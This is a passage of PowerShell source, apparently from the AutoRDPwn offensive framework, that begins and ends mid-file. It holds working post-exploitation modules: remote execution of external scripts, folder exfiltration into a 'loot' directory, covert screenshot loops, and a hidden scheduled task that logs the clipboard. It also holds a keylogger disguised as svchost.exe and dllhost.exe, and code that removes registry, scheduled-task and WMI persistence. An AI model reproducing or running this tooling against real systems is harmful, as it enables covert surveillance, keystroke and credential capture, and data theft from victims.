    elseif (Test-Path -LiteralPath $source) {
        $localScript = (Resolve-Path -LiteralPath $source).Path
    }
    else { throw 'The external script could not be found.' }
    if (Test-ARIsLocalTarget) {
        $result = & {
            param($path, $functionName)
            . $path
            if ($functionName -ne '') { Invoke-Expression $functionName }
        } $localScript $function
        Show-ARText $result
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnScript_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'external.ps1'
        Copy-ARFileToTarget -LocalPath $localScript -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        $result = Invoke-Command -Session $session -ArgumentList $remoteScript, $function -ScriptBlock {
            param($path, $functionName)
            Push-Location (Split-Path -Parent $path)
            try {
                . $path
                if ($functionName -ne '') { Invoke-Expression $functionName }
            }
            finally { Pop-Location }
        } -ErrorAction Stop
        Show-ARText $result
    }
    Set-ARStatus 'External script executed' 'Ok'
}

function Invoke-ARModuleRunAs {
    if (-not (Test-ARIsLocalTarget)) { throw 'RunAs only works on the local computer.' }
    $user = Read-ARValue (Get-ARText 'txt78' 'Enter the username')
    $plain = Read-ARSecret 'Password'
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    $context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine', $env:COMPUTERNAME)
    if (-not $context.ValidateCredentials($user, $plain)) {
        throw (Get-ARText 'txt81' 'Wrong credentials! Returning to the main menu..')
    }
    Import-ARToolScript 'Resources\Scripts\Invoke-RunAs.ps1'
    $executable = Join-Path $script:ARTools 'RunAs.exe'
    if (-not (Test-Path -LiteralPath $executable)) { throw 'RunAs could not be extracted.' }
    & $executable -u $user -p $plain -e 'powershell.exe -NoExit'
    Set-ARStatus 'Process launched as the new user' 'Ok'
}

function Test-ARModuleEscapePressed {
    # Escape drains pending keys; redirected or unavailable console input just
    # reads false so the caller never has to guard KeyAvailable itself.
    try {
        while ([Console]::KeyAvailable) {
            $key = [Console]::ReadKey($true)
            if ($key.Key -eq [System.ConsoleKey]::Escape) { return $true }
        }
    }
    catch { return $false }
    return $false
}

function Wait-ARModuleSeconds {
    # Sleeps in 100 ms slices so Escape stays responsive between long waits.
    param([Parameter(Mandatory = $true)][int]$Seconds)
    if ($Seconds -lt 1) { Start-Sleep -Milliseconds 250; return (Test-ARModuleEscapePressed) }
    $deadline = [DateTime]::Now.AddSeconds([double]$Seconds)
    while ([DateTime]::Now -lt $deadline) {
        if (Test-ARModuleEscapePressed) { return $true }
        Start-Sleep -Milliseconds 100
    }
    return $false
}

function New-ARModuleToken {
    # Uppercase hex cut from a guid: unique per run by construction.
    param([int]$Length = 8)
    $token = [guid]::NewGuid().ToString('N').ToUpperInvariant()
    return $token.Substring(0, [Math]::Min($Length, $token.Length))
}

function Get-ARModuleDetailPath {
    # Ledger details are flat "key: value; key: value" strings; paths written
    # by the machine (windows paths, guids) never contain quotes, so the lazy
    # match up to the next separator is exact.
    param([string]$Detail, [string]$Label)
    if ([string]::IsNullOrWhiteSpace($Detail)) { return '' }
    $regex = [regex]::Escape($Label) + ':\s*([^;]+?)(?:;|$)'
    $match = [regex]::Match($Detail, $regex)
    if ($match.Success) { return $match.Groups[1].Value.Trim() }
    return ''
}

function Remove-ARPersistenceItems {
    # Shared by the persistence kit (-Remove) and by Remove-ARModuleArtifacts
    # at session end: exact ledger entries first, then leftover AutoRDPwn
    # shapes when -IncludeUnknown is set. Returns how many artifacts were
    # found and removed (one per recorded entry; sweeps count one per batch).
    param(
        [object[]]$Items = @(),
        [switch]$IncludeUnknown
    )
    $removed = 0
    $ledgerItems = @($Items)
    $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'

    # 1) HKCU run values recorded by the kit, plus the heartbeat process and
    #    its staged files. Names are random per run, so removal repeats safely.
    foreach ($item in $ledgerItems) {
        if ([string]$item.Kind -ne 'Run') { continue }
        $runName = [string]$item.Name
        $scriptPath = Get-ARModuleDetailPath -Detail ([string]$item.Detail) -Label 'script'
        $logPath = Get-ARModuleDetailPath -Detail ([string]$item.Detail) -Label 'log'
        try {
            $hadValue = [bool](Invoke-ARTargetCommand -ScriptBlock {
                param($key, $name, $payloadPath, $logPath)
                if ($payloadPath -ne '' -or $logPath -ne '') {
                    Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
                        Where-Object {
                            if (-not $_.CommandLine) { return $false }
                            return (($payloadPath -ne '' -and $_.CommandLine.Contains($payloadPath)) -or ($logPath -ne '' -and $_.CommandLine.Contains($logPath)))
                        } |
                        ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
                }
                if ($payloadPath -ne '') { Remove-Item -LiteralPath $payloadPath -Force -ErrorAction SilentlyContinue }
                if ($logPath -ne '') { Remove-Item -LiteralPath $logPath -Force -ErrorAction SilentlyContinue }
                $registryItem = Get-Item -LiteralPath $key -ErrorAction SilentlyContinue
                if ($null -eq $registryItem) { return $false }
                if ($null -eq $registryItem.GetValue($name)) { return $false }
                Remove-ItemProperty -Path $key -Name $name -Force -ErrorAction SilentlyContinue
                return $true
            } -ArgumentList $runKey, $runName, $scriptPath, $logPath)
            if ($hadValue) {
                $removed++
                Write-ARSuccess ('Removed run value: ' + $runName)
            }
        }
        catch { Write-ARWarn ('Run value removal incomplete: ' + $_.Exception.Message) }
    }

    # 2) Logon tasks recorded by the kit: end the run, kill the payload
    #    process, drop the staged script, unregister the task.
    foreach ($item in $ledgerItems) {
        if ([string]$item.Kind -ne 'Task') { continue }
        $taskName = [string]$item.Name
        $scriptPath = Get-ARModuleDetailPath -Detail ([string]$item.Detail) -Label 'script'
        try {
            $taskStatus = [bool](Invoke-ARTargetCommand -ScriptBlock {
                param($name, $payloadPath)
                $found = ($null -ne (Get-ScheduledTask -TaskName $name -ErrorAction SilentlyContinue))
                & schtasks.exe /end /tn $name 2>&1 | Out-Null
                if ($payloadPath -ne '') {
                    Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
                        Where-Object { $_.CommandLine -and $_.CommandLine.Contains($payloadPath) } |
                        ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
                    Remove-Item -LiteralPath $payloadPath -Force -ErrorAction SilentlyContinue
                }
                Unregister-ScheduledTask -TaskName $name -Confirm:$false -ErrorAction SilentlyContinue
                return $found
            } -ArgumentList $taskName, $scriptPath)
            if ($taskStatus) {
                $removed++
                Write-ARSuccess ('Removed logon task: ' + $taskName)
            }
            if (Get-Variable -Name ARRemoteTasks -Scope Script -ErrorAction SilentlyContinue) { [void]$script:ARRemoteTasks.Remove($taskName) }
        }
        catch { Write-ARWarn ('Task removal incomplete: ' + $_.Exception.Message) }
    }

    # 3) WMI trios recorded by the kit: kill anything still running from the
    #    bound command line, then drop bindings before consumers and filters.
    foreach ($item in $ledgerItems) {
        if ([string]$item.Kind -ne 'Wmi') { continue }
        $filterName = [string]$item.Name
        $consumerName = Get-ARModuleDetailPath -Detail ([string]$item.Detail) -Label 'consumer'
        if ($consumerName -eq '') { $consumerName = $filterName -replace 'AutoRDPwnF', 'AutoRDPwnC' }
        $payloadPath = Get-ARModuleDetailPath -Detail ([string]$item.Detail) -Label 'script'
        try {
            $wmiStatus = Invoke-ARTargetCommand -ScriptBlock {
                param($filterName, $consumerName, $payloadPath)
                if ($payloadPath -ne '') {
                    Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
                        Where-Object { $_.CommandLine -and $_.CommandLine.Contains($payloadPath) } |
                        ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
                }
                $stats = @{ Filter = $false; Consumer = $false }
                $bindings = @(Get-WmiObject -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' -ErrorAction SilentlyContinue)
                foreach ($binding in $bindings) {
                    $references = [string]$binding.Filter + ' ' + [string]$binding.Consumer
                    if ($references.Contains(('Name="' + $filterName + '"')) -or $references.Contains(('Name="' + $consumerName + '"'))) {
                        Remove-WmiObject -InputObject $binding -ErrorAction SilentlyContinue
                    }
                }
                $consumers = @(Get-WmiObject -Namespace 'root\subscription' -Class 'CommandLineEventConsumer' -ErrorAction SilentlyContinue | Where-Object { [string]$_.Name -eq $consumerName })
                foreach ($consumer in $consumers) { $stats.Consumer = $true; Remove-WmiObject -InputObject $consumer -ErrorAction SilentlyContinue }
                $filters = @(Get-WmiObject -Namespace 'root\subscription' -Class '__EventFilter' -ErrorAction SilentlyContinue | Where-Object { [string]$_.Name -eq $filterName })
                foreach ($filterObject in $filters) { $stats.Filter = $true; Remove-WmiObject -InputObject $filterObject -ErrorAction SilentlyContinue }
                return $stats
            } -ArgumentList $filterName, $consumerName, $payloadPath
            if ($wmiStatus.Filter -or $wmiStatus.Consumer) {
                $removed++
                Write-ARSuccess ('Removed WMI subscription: ' + $filterName + ' / ' + $consumerName)
            }
        }
        catch { Write-ARWarn ('WMI subscription removal incomplete: ' + $_.Exception.Message) }
    }

    if ($IncludeUnknown) {
        # Interrupted installs leave shapes behind; the sweep uses the same
        # prefixes and patterns Remove-ARTargetArtifacts already recognizes,
        # so both gates agree on what belongs to this tool.
        try {
            $sweepRun = @(Invoke-ARTargetCommand -ScriptBlock {
                param($key)
                $names = @()
                $registryItem = Get-Item -LiteralPath $key -ErrorAction SilentlyContinue
                if ($null -ne $registryItem) {
                    foreach ($valueName in $registryItem.GetValueNames()) {
                        if ($valueName -like 'ARDP_*') {
                            Remove-ItemProperty -Path $key -Name $valueName -Force -ErrorAction SilentlyContinue
                            $names += $valueName
                        }
                    }
                }
                return $names
            } -ArgumentList $runKey)
            foreach ($valueName in $sweepRun) {
                $removed++
                Write-ARSuccess ('Removed leftover run value: ' + $valueName)
            }
        }
        catch { Write-ARWarn ('Run value sweep incomplete: ' + $_.Exception.Message) }

        try {
            $sweepTasks = @(Invoke-ARTargetCommand -ScriptBlock {
                $names = @()
                $tasks = @(Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object {
                    $nameMatch = ($_.TaskName -match '^AutoRDPwn[A-F0-9]{6}$')
                    if (-not $nameMatch -and $_.TaskName -match '^W[0-9A-F]{8}$') {
                        $actionText = ''
                        foreach ($action in $_.Actions) { $actionText += [string]$action.Execute + ' ' + [string]$action.Arguments + ' ' }
                        if ($actionText -match 'Windows\\Temp\\W[0-9A-F]{8}\.ps1') { $nameMatch = $true }
                    }
                    return $nameMatch
                })
                foreach ($task in $tasks) {
                    $payloadPath = ''
                    foreach ($action in $task.Actions) {
                        $pathMatch = [regex]::Match(([string]$action.Execute + ' ' + [string]$action.Arguments), 'C:\\Windows\\Temp\\W[0-9A-F]{8}\.ps1')
                        if ($pathMatch.Success) { $payloadPath = $pathMatch.Value; break }
                    }
                    if ($payloadPath -ne '') {
                        Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
                            Where-Object { $_.CommandLine -and $_.CommandLine.Contains($payloadPath) } |
                            ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
                        Remove-Item -LiteralPath $payloadPath -Force -ErrorAction SilentlyContinue
                    }
                    & schtasks.exe /end /tn $task.TaskName 2>&1 | Out-Null
                    Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false -ErrorAction SilentlyContinue
                    $names += $task.TaskName
                }
                return $names
            })
            foreach ($taskName in $sweepTasks) {
                $removed++
                Write-ARSuccess ('Removed leftover task: ' + $taskName)
            }
        }
        catch { Write-ARWarn ('Task sweep incomplete: ' + $_.Exception.Message) }

        try {
            $sweepWmi = Invoke-ARTargetCommand -ScriptBlock {
                $stats = @{ Filters = 0; Consumers = 0 }
                $bindings = @(Get-WmiObject -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' -ErrorAction SilentlyContinue)
                foreach ($binding in $bindings) {
                    $references = [string]$binding.Filter + ' ' + [string]$binding.Consumer
                    if ($references -like '*AutoRDPwnF*' -or $references -like '*AutoRDPwnC*') {
                        Remove-WmiObject -InputObject $binding -ErrorAction SilentlyContinue
                    }
                }
                $consumers = @(Get-WmiObject -Namespace 'root\subscription' -Class 'CommandLineEventConsumer' -ErrorAction SilentlyContinue | Where-Object { [string]$_.Name -like 'AutoRDPwnC*' })
                foreach ($consumer in $consumers) { $stats.Consumers = $stats.Consumers + 1; Remove-WmiObject -InputObject $consumer -ErrorAction SilentlyContinue }
                $filters = @(Get-WmiObject -Namespace 'root\subscription' -Class '__EventFilter' -ErrorAction SilentlyContinue | Where-Object { [string]$_.Name -like 'AutoRDPwnF*' })
                foreach ($filterObject in $filters) { $stats.Filters = $stats.Filters + 1; Remove-WmiObject -InputObject $filterObject -ErrorAction SilentlyContinue }
                return $stats
            }
            $sweepWmiTotal = [int]$sweepWmi.Filters + [int]$sweepWmi.Consumers
            if ($sweepWmiTotal -gt 0) {
                $removed++
                Write-ARSuccess ('Removed leftover WMI objects: ' + $sweepWmiTotal)
            }
        }
        catch { Write-ARWarn ('WMI sweep incomplete: ' + $_.Exception.Message) }
    }

    return $removed
}

function Invoke-ARModuleFileExfil {
    $target = Get-ARTargetComputer
    $folder = Read-ARValue 'Remote folder to collect' ''
    if ([string]::IsNullOrWhiteSpace($folder)) { Write-ARWarn 'No folder was provided.'; return }
    $stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
    $lootDirectory = Get-ARLootDirectory 'exfil'
    $localZip = Join-Path $lootDirectory ($safeTarget + '-' + $stamp + '.zip')
    # ZipFile needs this assembly loaded before OpenRead.
    try { Add-Type -AssemblyName System.IO.Compression.FileSystem } catch { }
    try {
        if (Test-ARIsLocalTarget) {
            # Local collection lands straight in the loot folder: no staging
            # roundtrip, nothing left for the cleanup gate to walk.
            Compress-Archive -Path (Join-Path $folder '*') -DestinationPath $localZip -Force -ErrorAction Stop
            $archive = [System.IO.Compression.ZipFile]::OpenRead($localZip)
            try { $entries = $archive.Entries.Count } finally { $archive.Dispose() }
            $megabytes = [Math]::Round((Get-Item -LiteralPath $localZip).Length / 1MB, 2)
            Write-ARSuccess ('Loot saved to ' + $localZip + ' (' + $entries + ' entries, ' + $megabytes + ' MB)')
            Set-ARStatus 'Folder collected' 'Ok'
            return
        }
        $session = Get-ARTargetSession
        $remoteZip = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName '.zip')
        if (-not $script:ARModuleFiles.Contains($remoteZip)) { $script:ARModuleFiles.Add($remoteZip) }
        try {
            $exists = [bool](Invoke-ARTargetCommand -ScriptBlock { param($path) Test-Path -LiteralPath $path } -ArgumentList $folder)
            if (-not $exists) { Write-ARWarn ('The folder does not exist on the target: ' + $folder); return }
            Invoke-ARTargetCommand -ScriptBlock {
                param($folderPath, $archivePath)
                Compress-Archive -Path (Join-Path $folderPath '*') -DestinationPath $archivePath -Force -ErrorAction Stop
            } -ArgumentList $folder, $remoteZip | Out-Null
            Receive-ARFileFromTarget -RemotePath $remoteZip -LocalPath $localZip -Session $session | Out-Null
            $archive = [System.IO.Compression.ZipFile]::OpenRead($localZip)
            try { $entries = $archive.Entries.Count } finally { $archive.Dispose() }
            $megabytes = [Math]::Round((Get-Item -LiteralPath $localZip).Length / 1MB, 2)
            Write-ARSuccess ('Loot saved to ' + $localZip + ' (' + $entries + ' entries, ' + $megabytes + ' MB)')
            Set-ARStatus 'Folder exfiltrated' 'Ok'
        }
        finally {
            # The staged archive dies with the run even when the pull failed.
            try {
                Invoke-ARTargetCommand -ScriptBlock { param($path) Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue } -ArgumentList $remoteZip | Out-Null
            } catch { }
            [void]$script:ARModuleFiles.Remove($remoteZip)
        }
    }
    catch { Write-ARWarn ('Folder collection failed: ' + $_.Exception.Message) }
}

function Invoke-ARModuleScreenshotLoop {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Screenshot loop'
    $frames = 0
    [void][int]::TryParse((Read-ARValue 'Frames' '10'), [ref]$frames)
    if ($frames -lt 1) { $frames = 10 }
    $interval = 0
    [void][int]::TryParse((Read-ARValue 'Seconds between frames' '5'), [ref]$interval)
    if ($interval -lt 1) { $interval = 5 }
    $stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
    $captureFolder = Join-Path (Get-ARLootDirectory 'shots') ($safeTarget + '-' + $stamp)
    New-Item -ItemType Directory -Path $captureFolder -Force | Out-Null
    $shotPath = Join-Path $script:ARTools 'stealthshot.png'
    $userTarget = [string]$script:ARTarget['User']
    if ([string]::IsNullOrWhiteSpace($userTarget)) {
        $userTarget = Read-ARValue 'Target user' $env:USERNAME
        $script:ARTarget['User'] = $userTarget
    }
    $password = Get-ARPlainPassword
    . (Get-ARResourcePath 'Resources\Scripts\Invoke-StealthScreen.ps1')
    $frameCount = 0
    try {
        for ($index = 1; $index -le $frames; $index++) {
            # Each frame rides the stealth screen shot route: it stages a
            # one-shot capture task in the console session, pulls the png back
            # and tears its task, script and rules down before returning.
            # Invoke-Item pops a viewer on the png once - an accepted quirk of
            # reusing the route instead of editing its script.
            Invoke-StealthScreen -Target $target -User $userTarget -Pass $password -Mode shot
            if (-not (Test-Path -LiteralPath $shotPath)) { Write-ARWarn 'No screenshot arrived from the target.'; break }
            $frameFile = Join-Path $captureFolder (('frame-{0:d3}.jpg' -f $index))
            $moved = $false
            for ($attempt = 0; $attempt -lt 20 -and -not $moved; $attempt++) {
                try {
                    Move-Item -LiteralPath $shotPath -Destination $frameFile -Force -ErrorAction Stop
                    $moved = $true
                }
                catch { Start-Sleep -Milliseconds 250 }
            }
            if (-not $moved) {
                # A photo viewer may still hold the png open: copy anyway.
                Copy-Item -LiteralPath $shotPath -Destination $frameFile -Force
                Remove-Item -LiteralPath $shotPath -Force -ErrorAction SilentlyContinue
            }
            $frameCount++
            Write-Host ('  saved ' + (Split-Path -Leaf $frameFile) + ' (' + [Math]::Round((Get-Item -LiteralPath $frameFile).Length / 1KB, 1) + ' KB)') -ForegroundColor Gray
            if ($index -lt $frames) {
                Write-ARProgress -Activity 'Screenshot loop' -Percent ([int](($index * 100) / $frames)) -Status ('frame ' + $index + ' of ' + $frames + ' - Escape stops')
                if (Wait-ARModuleSeconds -Seconds $interval) { Write-ARInfo 'Escape pressed - screenshot loop stopped early.'; break }
            }
        }
    }
    finally {
        # An empty capture folder means nothing was collected: remove it so
        # the loot tree only ever holds real evidence.
        $leftovers = @(Get-ChildItem -LiteralPath $captureFolder -Force -ErrorAction SilentlyContinue)
        if ($leftovers.Count -eq 0) { Remove-Item -LiteralPath $captureFolder -Force -ErrorAction SilentlyContinue }
    }
    Set-ARStatus ('Screenshot loop finished - ' + $frameCount + ' frame(s) in ' + $captureFolder) 'Ok'
}

function Invoke-ARModuleClipboardWatch {
    # The watcher runs as a scheduled task with the logged-on user as the
    # principal, the same technique the stealth screen route uses: clipboard
    # state only exists inside the interactive session. Payload loop is
    # terminated from outside (schtasks /end or kill), so it needs no stop file.
    $taskName = New-ARRemoteTempName
    $scriptPath = Join-Path 'C:\Windows\Temp' ($taskName + '.ps1')
    $logPath = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName '.txt')
    $template = @'
$ErrorActionPreference = 'SilentlyContinue'
$log = '__LOGPATH__'
$seen = New-Object System.Collections.Generic.HashSet[string]
while ($true) {
    try {
        $text = Get-Clipboard -Raw
        if (-not [string]::IsNullOrEmpty($text)) {
            if (-not $seen.Contains($text)) {
                $null = $seen.Add($text)
                [System.IO.File]::AppendAllText($log, ('[' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + '] ' + $text + "`r`n"), [System.Text.Encoding]::UTF8)
            }
        }
    }
    catch { }
    Start-Sleep -Seconds 2
}
'@
    try {
        try {
            $work = New-ARWorkDirectory
            $localPayload = Join-Path $work ($taskName + '.ps1')
            [System.IO.File]::WriteAllText($localPayload, $template.Replace('__LOGPATH__', $logPath), [System.Text.Encoding]::UTF8)
            Copy-ARFileToTarget -LocalPath $localPayload -RemotePath $scriptPath | Out-Null
            if (-not $script:ARModuleFiles.Contains($scriptPath)) { $script:ARModuleFiles.Add($scriptPath) }
            if (-not $script:ARModuleFiles.Contains($logPath)) { $script:ARModuleFiles.Add($logPath) }
            Invoke-ARTargetCommand -ScriptBlock {
                param($name, $path, $userName)
                $userId = $userName
                if ($userId -and $userId -notmatch '\\') { $userId = $env:COMPUTERNAME + '\' + $userId }
                if ([string]::IsNullOrWhiteSpace($userId)) { $userId = $env:USERDOMAIN + '\' + $env:USERNAME }
                $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument ('-nop -w hidden -ep bypass -f "' + $path + '"')
                $principal = New-ScheduledTaskPrincipal -UserId $userId -LogonType Interactive -RunLevel Highest
                Register-ScheduledTask -TaskName $name -Action $action -Principal $principal -Force -ErrorAction Stop | Out-Null
                Start-ScheduledTask -TaskName $name -ErrorAction Stop
            } -ArgumentList $taskName, $scriptPath, ([string]$script:ARTarget['User']) | Out-Null
            $script:ARRemoteTasks.Add($taskName)
            Write-ARSuccess ('Clipboard watcher staged and started (' + $taskName + ').')
            $poll = 0
            [void][int]::TryParse((Read-ARValue 'Seconds between polls' '5'), [ref]$poll)
            if ($poll -lt 1) { $poll = 5 }
            Write-ARInfo 'Clipboard watch running - Escape stops it.'
            $cursor = 0
            # The log is read whole and sliced by the previous length: reading
            # incrementally over a file the task appends to is not possible
            # without a second remote state file.
            while ($true) {
                $stopped = Wait-ARModuleSeconds -Seconds $poll
                $text = ''
                try {
                    $text = [string](Invoke-ARTargetCommand -ScriptBlock {
                        param($log)
                        if (-not (Test-Path -LiteralPath $log)) { return '' }
                        return [System.IO.File]::ReadAllText($log, [System.Text.Encoding]::UTF8)
                    } -ArgumentList $logPath)
                }
                catch { }
                if ($text.Length -lt $cursor) { $cursor = 0 }
                if ($text.Length -gt $cursor) {
                    $newText = $text.Substring($cursor)
                    $cursor = $text.Length
                    foreach ($line in ($newText -split "`r?`n")) {
                        $entry = $line.Trim()
                        if ($entry -ne '') { Write-Host ('  clipboard: ' + $entry) -ForegroundColor Gray }
                    }
                }
                if ($stopped) { Write-ARInfo 'Escape pressed - clipboard watch stopped.'; break }
            }
        }
        finally {
            # End the run, kill the payload process, unregister, delete both
            # files, and tidy the session lists so the later sweep finds nothing.
            try {
                Invoke-ARTargetCommand -ScriptBlock {
                    param($name, $path, $log)
                    & schtasks.exe /end /tn $name 2>&1 | Out-Null
                    Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
                        Where-Object { $_.CommandLine -and $_.CommandLine.Contains($path) } |
                        ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
                    Unregister-ScheduledTask -TaskName $name -Confirm:$false -ErrorAction SilentlyContinue
                    Remove-Item -LiteralPath $path, $log -Force -ErrorAction SilentlyContinue
                } -ArgumentList $taskName, $scriptPath, $logPath | Out-Null
            }
            catch { }
            [void]$script:ARRemoteTasks.Remove($taskName)
            [void]$script:ARModuleFiles.Remove($scriptPath)
            [void]$script:ARModuleFiles.Remove($logPath)
        }
        Set-ARStatus 'Clipboard watch stopped' 'Ok'
    }
    catch { Write-ARWarn ('Clipboard watch failed: ' + $_.Exception.Message) }
}

function Invoke-ARModuleKeyloggerFast {
    $target = Get-ARTargetComputer
    # Payload bytes load exactly like the blocking keylogger module; only the
    # monitoring loop differs (pull + mirror at a byte offset, Escape to stop).
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-Keylogger.ps1'
    Push-Location $script:ARTools
    try { . $scriptPath; $first = $Content1; $second = $Content2 } finally { Pop-Location }
    if (-not $first -or -not $second) { throw 'The keylogger payload could not be loaded.' }
    $stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
    $mirrorLog = Join-Path (Get-ARLootDirectory 'keys') ($safeTarget + '-' + $stamp + '.log')
    $work = New-ARWorkDirectory
    $localDll = Join-Path $work 'dllhost.exe'
    $localHostExe = Join-Path $work 'svchost.exe'
    [System.IO.File]::WriteAllBytes($localDll, $first)
    [System.IO.File]::WriteAllBytes($localHostExe, $second)
    $pullFile = Join-Path $work 'config.dat'
    $logPath = ''
    $remoteDirectory = ''
    $remoteHost = ''
    try {
        if (Test-ARIsLocalTarget) {
            $logPath = Join-Path $env:LOCALAPPDATA 'config.dat'
            Get-Process | Where-Object { $_.Path -eq $localHostExe -or $_.Path -like '*\AutoRDPwnKey_*\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
            Remove-Item -LiteralPath $logPath -Force -ErrorAction SilentlyContinue
            if (-not $script:ARModuleFiles.Contains($logPath)) { $script:ARModuleFiles.Add($logPath) }
            Push-Location $work
            try { & $localDll nomsg explorer.exe $localHostExe | Out-Null } finally { Pop-Location }
            Start-Sleep -Milliseconds 500
            if (-not (Test-Path -LiteralPath $logPath)) { New-Item -ItemType File -Path $logPath -Force | Out-Null }
        }
        else {
            $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnKey_' + [guid]::NewGuid().ToString('N')
            $remoteHost = Join-Path $remoteDirectory 'svchost.exe'
            Copy-ARFileToTarget -LocalPath $localDll -RemotePath (Join-Path $remoteDirectory 'dllhost.exe') | Out-Null
            Copy-ARFileToTarget -LocalPath $localHostExe -RemotePath $remoteHost | Out-Null
            $script:ARRemoteTempDirs.Add($remoteDirectory)
            $logPath = [string](Invoke-ARTargetCommand -ScriptBlock {
                param($dll, $hostProcess)
                Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\AutoRDPwnKey_*\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
                $log = Join-Path $env:LOCALAPPDATA 'config.dat'
                Remove-Item -LiteralPath $log -Force -ErrorAction SilentlyContinue
                Push-Location (Split-Path -Parent $dll)
                try { & $dll nomsg explorer.exe $hostProcess | Out-Null } finally { Pop-Location }
                Start-Sleep -Milliseconds 500
                if (-not (Test-Path -LiteralPath $log)) { New-Item -ItemType File -Path $log -Force | Out-Null }
                return $log
            } -ArgumentList (Join-Path $remoteDirectory 'dllhost.exe'), $remoteHost)
            if (-not $script:ARModuleFiles.Contains($logPath)) { $script:ARModuleFiles.Add($logPath) }
        }
        if ([string]::IsNullOrWhiteSpace($logPath)) { throw 'The keylogger log path could not be resolved.' }
        Write-ARInfo ('Fast keylogger running - keystrokes mirror every 15 seconds into ' + $mirrorLog + '. Escape stops it.')
        $cursor = 0
        $stopped = $false
        while (-not $stopped) {
            $stopped = Wait-ARModuleSeconds -Seconds 15
            $bytes = $null
            try {
                if (Test-ARIsLocalTarget) {
                    if (Test-Path -LiteralPath $logPath) { $bytes = [System.IO.File]::ReadAllBytes($logPath) }
                }
                else {
                    Receive-ARFileFromTarget -RemotePath $logPath -LocalPath $pullFile | Out-Null
                    $bytes = [System.IO.File]::ReadAllBytes($pullFile)
                }
            }
            catch { }
            if ($bytes) {
                if ($bytes.Length -lt $cursor) { $cursor = 0 }
                if ($bytes.Length -gt $cursor) {
                    $fresh = [System.Text.Encoding]::UTF8.GetString($bytes, $cursor, ($bytes.Length - $cursor))
                    $cut = $fresh.LastIndexOf("`n")
                    if ($cut -ge 0) {
                        # Only complete lines advance the offset, so a stroke
                        # landing mid-line never splits across two prints.
                        $printable = $fresh.Substring(0, ($cut + 1))
                        $cursor += [System.Text.Encoding]::UTF8.GetByteCount($printable)
                        [System.IO.File]::AppendAllText($mirrorLog, $printable, [System.Text.Encoding]::UTF8)
                        foreach ($line in ($printable -split "`n")) {
                            $stroke = $line.Trim()
                            if ($stroke -ne '') { Write-Host ('  keys: ' + $stroke) -ForegroundColor Gray }
                        }
                    }
                }
            }
        }
    }
    finally {
        try {
            if (Test-ARIsLocalTarget) {
                Get-Process | Where-Object { $_.Path -eq $localHostExe -or $_.Path -like '*\AutoRDPwnKey_*\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
                if ($logPath -ne '') { Remove-Item -LiteralPath $logPath -Force -ErrorAction SilentlyContinue }
            }
            elseif ($remoteDirectory -ne '') {
                Invoke-ARTargetCommand -ScriptBlock {
                    param($hostProcess, $log, $directory)
                    Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\AutoRDPwnKey_*\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
                    Remove-Item -LiteralPath $log -Force -ErrorAction SilentlyContinue
                    Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue
                } -ArgumentList $remoteHost, $logPath, $remoteDirectory | Out-Null
                [void]$script:ARRemoteTempDirs.Remove($remoteDirectory)
                [void]$script:ARModuleFiles.Remove($logPath)
            }
        }
        catch { }
    }
    Set-ARStatus ('Keylogger stopped - mirror log: ' + $mirrorLog) 'Ok'
}

function Invoke-ARModulePersistenceKit {
    param([switch]$Remove)

    $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'

    if ($Remove) {
        # The registry backup list is not cleared here: Remove-ARTargetArtifacts
        # replays it at session end, and replays on already-deleted names are
        # no-ops. A sweep picks up anything the ledger no longer knows about.
        $ledger = @()
        if (Get-Variable -Name ARPersistenceItems -Scope Script -ErrorAction SilentlyContinue) { $ledger = @($script:ARPersistenceItems.ToArray()) }
        $removed = Remove-ARPersistenceItems -Items $ledger -IncludeUnknown
        if (Get-Variable -Name ARPersistenceItems -Scope Script -ErrorAction SilentlyContinue) { $script:ARPersistenceItems.Clear() }
